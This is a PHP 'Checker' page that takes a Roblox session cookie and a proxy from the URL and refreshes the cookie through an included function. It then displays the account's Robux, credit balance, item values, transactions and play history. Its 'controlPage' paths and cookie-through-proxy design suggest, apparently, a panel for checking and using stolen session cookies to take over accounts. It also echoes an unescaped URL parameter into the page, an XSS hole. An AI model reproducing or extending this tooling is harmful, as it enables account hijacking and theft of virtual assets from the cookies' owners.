<?php
include('../controlPage/apis/function.php');
$cookie = refresh($_GET['cookie'],$_GET['proxy']);
if(empty($_GET['cookie'])){
http_response_code(403);
} else if($cookie == 'no') {
die("<h1 style='color: red;text-align: center;font-size: 500;'>DIE</h1>");
} else if(empty($cookie)) {
die("<h1 style='color: red;text-align: center;font-size: 500;'>Please Refresh/Try Later</h1>");
}
?>
<!doctype html>
<html lang="en">

<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
	<link rel="stylesheet" href="/controlPage/fonts/style.css">
	<link rel="stylesheet" href="/controlPage/css/owl.carousel.min.css">
	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="/controlPage/css/bootstrap.min.css">
	<!-- Style -->
	<link rel="stylesheet" href="/controlPage/css/style.css">
	<title>Checker</title>
</head>

<body>
	<div class="content">
		<div class="container">
			<div class="row">
				<div class="col-md-12 contents">
				    <center id="avatar"><i class="fas fa-circle-notch fa-spin"></i></center>
					<div class="row justify-content-center">
						<div class="col-md-8">
							<div class="mb-4">
								<center><h3>Public Information</h3></center>
							</div>
							<div class="mb-4">
							    <span id="displayname">Display Name: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="username">Username: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="userid">UserId: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="friends">Friends: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="followers">Followers: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="followings">Followings: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="age">Account Age: <i class="fas fa-circle-notch fa-spin"></i></span>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<br><hr><br>
		<div class="container">
			<div class="row">
				<div class="col-md-12 contents">
					<div class="row justify-content-center">
						<div class="col-md-8">
							<div class="mb-4">
								<center><h3>Economy</h3></center>
							</div>
							<div class="mb-4">
							    <span id="robux">Robux: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="credit">Credit Balance: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="rap">Recent Average Price (RAP): <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="incoming">Incoming Robux (Summary): <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="outgoing">Outgoing Robux (Past Year): <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="premium">Premium: <i class="fas fa-circle-notch fa-spin"></i></span> <br>
							    <span id="collectibles">Collectibles: <i class="fas fa-circle-notch fa-spin"></i></span>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<br><hr><br>
		<div class="container">
			<div class="row">
				<div class="col-md-12 contents">
					<div class="row justify-content-center">
						<div class="col-md-8">
							<div class="mb-4">
								<center><h3>History</h3></center>
							</div>
							<div class="mb-4">
							    <span id="game">Game(s) was played: <i class="fas fa-circle-notch fa-spin"></i></span>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<br><hr><br>
	</div>
	<input id="cookie" value="<?=$cookie;?>&proxy=<?=$_GET['proxy'];?>" hidden>
	<script src="api/main.js"></script>
	<script src="/controlPage/apis/main.js"></script>
	<script src="//kit.fontawesome.com/4f35c87aca.js" crossorigin="anonymous"></script>
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
	<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
	<script src="/controlPage/js/popper.min.js"></script>
	<script src="/controlPage/js/bootstrap.min.js"></script>
	<script src="/controlPage/js/main.js"></script>
</body>

</html>